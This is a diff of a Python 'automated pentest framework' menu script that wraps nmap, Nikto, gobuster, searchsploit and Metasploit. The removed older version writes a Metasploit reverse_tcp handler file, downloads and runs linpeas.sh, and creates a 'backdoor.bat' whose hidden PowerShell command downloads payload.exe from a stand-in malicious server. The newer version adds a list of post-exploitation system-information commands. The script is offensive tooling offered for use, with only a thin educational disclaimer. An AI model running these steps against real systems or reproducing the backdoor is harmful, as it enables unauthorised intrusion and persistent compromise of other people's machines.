@@ -1,172 +1,235 @@
-import os
 import subprocess
-import requests
-import time
+import nmap
+import sys
+import os
 
-# Color coding for terminal
-RESET = "\033[0m"
-GREEN = "\033[92m"
-RED = "\033[91m"
-
-def banner():
-    print(f"{GREEN}Advanced Penetration Testing Framework{RESET}")
-    print(f"{GREEN}Use this script ONLY in a controlled environment.{RESET}")
-
-# 1. Target Information Gathering (Reconnaissance)
-def reconnaissance(target):
-    print(f"{GREEN}[+] Starting Reconnaissance for {target}...{RESET}")
-
-    # Passive Reconnaissance
-    print(f"{GREEN}[+] Running WHOIS lookup...{RESET}")
-    try:
-        whois_data = subprocess.getoutput(f"whois {target}")
-        print(whois_data)
-    except Exception as e:
-        print(f"{RED}[-] WHOIS lookup failed: {e}{RESET}")
-
-    # Active Reconnaissance
-    print(f"{GREEN}[+] Scanning open ports with Nmap...{RESET}")
-    try:
-        nmap_data = subprocess.getoutput(f"nmap -Pn -sV {target}")
-        print(nmap_data)
-    except Exception as e:
-        print(f"{RED}[-] Nmap scan failed: {e}{RESET}")
-
-    print(f"{GREEN}[+] Gathering Shodan Data...{RESET}")
-    # Replace with your Shodan API key
-    shodan_api_key = "YOUR_API_KEY"
-    url = f"https://api.shodan.io/shodan/host/{target}?key={shodan_api_key}"
-    try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            print(response.json())
-        else:
-            print(f"{RED}[-] Shodan returned an error: {response.text}{RESET}")
-    except Exception as e:
-        print(f"{RED}[-] Error in Shodan lookup: {e}{RESET}")
-
-# 2. Vulnerability Analysis
-def vulnerability_analysis(target):
-    print(f"{GREEN}[+] Running Vulnerability Scans on {target}...{RESET}")
-
-    # OpenVAS or Nessus (Assume they are pre-installed)
-    print(f"{GREEN}[+] Starting OpenVAS Scan...{RESET}")
-    os.system(f"omp -u admin -w admin -h {target}")
-
-    print(f"{GREEN}[+] Running Nikto for web vulnerability assessment...{RESET}")
-    try:
-        nikto_data = subprocess.getoutput(f"nikto -h {target}")
-        print(nikto_data)
-    except Exception as e:
-        print(f"{RED}[-] Nikto scan failed: {e}{RESET}")
-
-# 3. Directory Brute-forcing
-def brute_force_directories(target, wordlist):
-    print(f"{GREEN}[+] Starting Directory Brute-forcing for {target}...{RESET}")
-    with open(wordlist, 'r') as file:
-        for line in file:
-            dir_to_test = line.strip()
-            url = f"{target}/{dir_to_test}"
-
-            try:
-                response = requests.get(url)
-                # If the response is not a 404, consider it a valid directory
-                if response.status_code != 404:
-                    print(f"{GREEN}[+] Found: {url} (Status Code: {response.status_code}){RESET}")
-            except requests.RequestException as e:
-                print(f"{RED}[-] Error accessing {url}: {e}{RESET}")
-
-# 4. Exploitation
-def exploitation(target, lhost, lport):
-    print(f"{GREEN}[+] Exploiting Target {target}...{RESET}")
-
-    # Example: Running Metasploit commands
-    exploit_script = f"""
-    use exploit/multi/handler
-    set payload windows/meterpreter/reverse_tcp
-    set LHOST {lhost}
-    set LPORT {lport}
-    exploit
-    """
-
-    with open("exploit.rc", "w") as file:
-        file.write(exploit_script)
-
-    os.system("msfconsole -r exploit.rc")
-
-# 5. Privilege Escalation
-def privilege_escalation():
-    print(f"{GREEN}[+] Running Privilege Escalation Scripts...{RESET}")
-
-    print(f"{GREEN}[+] Running LinPEAS for Linux...{RESET}")
-    os.system("wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh")
-    os.system("chmod +x linpeas.sh && ./linpeas.sh")
-
-    print(f"{GREEN}[+] Running Windows Exploit Suggester...{RESET}")
-    os.system("windows-exploit-suggester.py --update")
-
-# 6. Post-Exploitation
-def post_exploitation():
-    print(f"{GREEN}[+] Setting up persistence and collecting sensitive data...{RESET}")
-
-    # Example: Creating a backdoor
-    backdoor_script = """
-    @echo off
-    powershell -w hidden -NoP -Exec Bypass -Command "Invoke-WebRequest -Uri 'http://malicious-server/payload.exe' -OutFile 'C:\\\\Windows\\\\Temp\\\\payload.exe'"
-    """
-
-    with open("backdoor.bat", "w") as file:
-        file.write(backdoor_script)
-
-    print(f"{GREEN}[+] Backdoor script created: backdoor.bat{RESET}")
-
-# Ask the user whether they want to go back to the menu or exit
-def ask_continue():
-    while True:
-        choice = input(f"{GREEN}[+] Do you want to go back to the main menu or exit? (m = menu, e = exit): {RESET}")
-        if choice.lower() == 'm':
-            main()
-            break
-        elif choice.lower() == 'e':
-            print(f"{GREEN}[+] Exiting the script...{RESET}")
-            exit()
-        else:
-            print(f"{RED}[-] Invalid option. Please choose again.{RESET}")
-
-# Main Menu
-def main():
-    banner()
-
-    print("1. Reconnaissance")
-    print("2. Vulnerability Analysis")
-    print("3. Directory Brute-forcing")
-    print("4. Exploitation")
-    print("5. Privilege Escalation")
-    print("6. Post-Exploitation")
-    choice = input("Select an option: ")
-
-    target = input("Enter target (IP/Domain): ") if choice in ['1', '2', '3', '4'] else None
-    lhost = input("Enter LHOST (Your IP): ") if choice == '4' else None
-    lport = input("Enter LPORT (Listening Port): ") if choice == '4' else None
-    wordlist = input(f"Enter path to wordlist: ") if choice == '3' else None
-
-    if choice == '1':
-        reconnaissance(target)
-    elif choice == '2':
-        vulnerability_analysis(target)
-    elif choice == '3':
-        brute_force_directories(target, wordlist)
-    elif choice == '4':
-        exploitation(target, lhost, lport)
-    elif choice == '5':
-        privilege_escalation()
-    elif choice == '6':
-        post_exploitation()
+# Clear screen function
+def clear_screen():
+    # For Windows
+    if sys.platform == "win32":
+        os.system('cls')
+    # For Linux and macOS
     else:
-        print(f"{RED}Invalid choice!{RESET}")
+        os.system('clear')
 
-    ask_continue()
+# Call the function to clear the screen
+clear_screen()
 
+# Rest of your script goes here
+    
+
+# ----- Logo and Header -----
+def print_header():
+    logo = """
+    
+   ▄████████    ▄████████  ▄████████  ▄██████▄  ███▄▄▄▄   ▀████    ▐████▀    ▄███████▄  ▄█        ▄██████▄   ▄█      ███     
+  ███    ███   ███    ███ ███    ███ ███    ███ ███▀▀▀██▄   ███▌   ████▀    ███    ███ ███       ███    ███ ███  ▀█████████▄ 
+  ███    ███   ███    █▀  ███    █▀  ███    ███ ███   ███    ███  ▐███      ███    ███ ███       ███    ███ ███▌    ▀███▀▀██ 
+ ▄███▄▄▄▄██▀  ▄███▄▄▄     ███        ███    ███ ███   ███    ▀███▄███▀      ███    ███ ███       ███    ███ ███▌     ███   ▀ 
+▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███        ███    ███ ███   ███    ████▀██▄     ▀█████████▀  ███       ███    ███ ███▌     ███     
+▀███████████   ███    █▄  ███    █▄  ███    ███ ███   ███   ▐███  ▀███      ███        ███       ███    ███ ███      ███     
+  ███    ███   ███    ███ ███    ███ ███    ███ ███   ███  ▄███     ███▄    ███        ███▌    ▄ ███    ███ ███      ███     
+  ███    ███   ██████████ ████████▀   ▀██████▀   ▀█   █▀  ████       ███▄  ▄████▀      █████▄▄██  ▀██████▀  █▀      ▄████▀   
+  ███    ███                                                                           ▀                                     
+                                       \033[1mразработано @ARTIST для INFLUXION\033[0m
+    """
+    print(logo)
+    print("Welcome to the Automated Pentest Framework!\n")
+    print("Note: This tool is for educational purposes only. Unauthorized use is prohibited.\n")
+
+# ----- Scanning Module -----
+def scan_target(ip):
+    nm = nmap.PortScanner()
+    try:
+        # Scan the first 1024 ports (you can modify the port range if needed)
+        nm.scan(ip, '1-1024')
+
+        # Check if the IP is found in the scan results
+        if ip in nm.all_hosts():
+            scan_result = nm[ip]
+
+            # Format the output vertically for better readability
+            result = f"Target IP: {ip}\n"
+            result += f"Status: {scan_result['status']['state']} (Reason: {scan_result['status']['reason']})\n"
+            result += f"MAC Address: {scan_result['addresses'].get('mac', 'N/A')}\n"
+            result += f"Vendor: {scan_result['vendor'].get(scan_result['addresses'].get('mac', ''), 'N/A')}\n"
+            result += "\nPorts:\n"
+
+            for port in scan_result['tcp']:
+                port_info = scan_result['tcp'][port]
+                result += f"  Port {port}: {port_info['state']} (Service: {port_info['name']})\n"
+                result += f"    Product: {port_info['product']}\n"
+                result += f"    Version: {port_info['version']}\n"
+                result += f"    Extra Info: {port_info.get('extrainfo', 'N/A')}\n"
+                result += f"    CPE: {port_info['cpe']}\n"
+                result += "\n"
+
+            return result
+
+        else:
+            return f"Target {ip} not found in scan results. It might be unreachable or have no open ports."
+    
+    except KeyError:
+        return f"Error: No results for target IP {ip}. Check if the target is reachable."
+    except Exception as e:
+        return f"Error occurred during scan: {str(e)}"
+
+
+# ----- Enumeration Module -----
+def run_nikto(target_ip):
+    result = subprocess.run(['nikto', '-h', target_ip], capture_output=True, text=True)
+    return result.stdout
+
+
+def run_gobuster(target_ip, target_port):
+    result = subprocess.run(['gobuster', 'dir', '-u', f'http://{target_ip}:{target_port}', '-w', '/usr/share/wordlists/dirb/common.txt'], capture_output=True, text=True)
+    return result.stdout
+
+
+# ----- Vulnerability Detection Module -----
+def search_exploits(service, version):
+    result = subprocess.run(['searchsploit', f'{service} {version}'], capture_output=True, text=True)
+    return result.stdout
+
+
+# ----- Exploitation Module -----
+def exploit_target(target_ip, target_port):
+    try:
+        # Specify the payload and listener IP/Port
+        
+
+        # Construct the Metasploit command for the exploit
+        msf_command = f"msfconsole -q -x"
+
+        # Print the command for debugging
+        print(f"Running Metasploit command: {msf_command}")
+
+        # Run the Metasploit command and capture the output
+        result = subprocess.run(msf_command, shell=True, capture_output=True, text=True)
+
+        # Print stdout and stderr to debug
+        print("Metasploit output:", result.stdout)
+        print("Metasploit errors:", result.stderr)
+
+        # Return the output
+        return result.stdout
+
+    except Exception as e:
+        return f"Error occurred during exploitation: {str(e)}"
+
+
+
+
+# ----- Post-Exploitation Module -----
+def post_exploit(target_ip):
+    print("\nGetting System Information:\n")
+
+    # Linux Post Exploitation Commands with Emojis (for display only)
+    linux_commands = [
+        "=> uname        (Current Kernel ka name dakhne k ley)",
+        "=>  uname -a    (Complete system info including kernel, OS, and architecture)",
+        "=>  hostnamectl (OS version, kernel, hostname dakhne k ley)",
+        "=>  neofetch    (Information about OS version, kernel, CPU, GPU, aur RAM usage)",
+        "=>  finger john (Information about john user real name, login status, aur last login time)",
+        "=>  uptime      (System ko chalaye huye kitna time ho gaya hai, aur current load dekhne k liye)",
+        "=>  top         (Real-time system processes aur resource usage dekhne k liye)",
+        "=>  arch        (System k architecture ka type pata chalega, jaise 64-bit (x86_64) ya 32-bit (i686))",
+        "=>  lscpu       (CPU ki detailed information dekhne k liye)",
+        "=>  lsblk       (Block devices (like hard drives, partitions) ki details dekhne k liye)",
+        "=>  lsipc       (Info about message queues, shared memory segments, aur semaphores ki list aur unki details)",
+        "=>  lspci       (System k PCI devices dekhne k liye)",
+        "=>  lsusb       (System k USB devices ko list karne k liye)",
+        "=>  who         (Currently logged-in users ki details dekhne k liye)",
+        "=>  last        (System k last login sessions dekhne k liye)",
+        "=>  df          (Disk usage ka summary dekhne k liye)",
+        "=>  df -h       (Human-readable format)",
+        "=>  du          (Specific directory ya file ka disk usage dekhne k liye)",
+        "=>  free        (System ke RAM aur swap memory ka usage dekhne k liye)",
+        "=>  free -h     (Human-readable format)",
+        "=>  vmstat      (CPU, memory, disk I/O aur system processes ka real-time stats dekhne k liye)",
+        "=>  vmstat 2    (Every 2 seconds stats update)",
+        "=>  lsb_release (Operating system ka version aur distribution details dekhne k liye)",
+        "=>  lsb_release -a",
+        "=>  dmesg       (System k boot time messages ya kernel logs dekhne k liye)",
+        "=>  inxi        (Detailed system information)",
+        "=>  htop        (Interactive, real-time process viewer)"
+        "=>  dmesg | less (Scroll through logs)",
+        "=>  cat /proc/cpuinfo (CPU ke detailed specs dekhne k liye)",
+        "=>  cat /proc/meminfo (Memory ka detailed stats dekhne k liye)",
+    ]
+
+    # Display Linux Commands with Emojis (only for information display)
+    print("\nLinux Post-Exploitation Commands:")
+    for command in linux_commands:
+        print(command)
+
+    # Linux Post Exploitation Commands (actual commands to execute)
+    linux_actual_commands = [
+        "uname",
+        
+        
+    ]
+
+    # Now execute the actual commands
+    print("\nExecuting system commands...")
+    for command in linux_actual_commands:
+        print(f"\nExecuting: {command}")
+        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+        if result.returncode == 0:
+            print(result.stdout)  # Display command output
+        else:
+            print(f"Error executing {command}: {result.stderr}")  # Display error if command fails
+
+    print("\nPost-Exploitation information gathering completed!")
+
+# ----- Menu Function -----
+def print_menu():
+    print("\n[1] Scan Target")
+    print("[2] Enumerate Services")
+    print("[3] Search for Vulnerabilities")
+    print("[4] Exploit Target")
+    print("[5] Post-Exploitation")
+    print("[6] Exit")
+
+# ----- Main Function -----
+def main():
+    print_header()
+    target_ip = input("Enter the target IP: ")
+
+    while True:
+        print_menu()
+        choice = input("Choose an option: ")
+
+        if choice == "1":
+            print("\nScanning target...")
+            print(scan_target(target_ip))
+
+        elif choice == "2":
+            print("\nEnumerating services...")
+            print(run_nikto(target_ip))
+            print(run_gobuster(target_ip, 80))
+
+        elif choice == "3":
+            service = input("\nEnter service (e.g., Apache): ")
+            version = input("Enter version (e.g., 2.4.49): ")
+            print("\nSearching for vulnerabilities...")
+            print(search_exploits(service, version))
+
+        elif choice == "4":
+            print("\nExploiting target...")
+            print(exploit_target(target_ip, 80))
+
+        elif choice == "5":
+            print("\nPost-Exploitation...")
+            post_exploit(target_ip)
+
+        elif choice == "6":
+            print("\nExiting... Goodbye!")
+            sys.exit(0)
+
+        else:
+            print("\nInvalid option! Please choose again.")
+
+# ----- Script Entry Point -----
 if __name__ == "__main__":
     main()
-
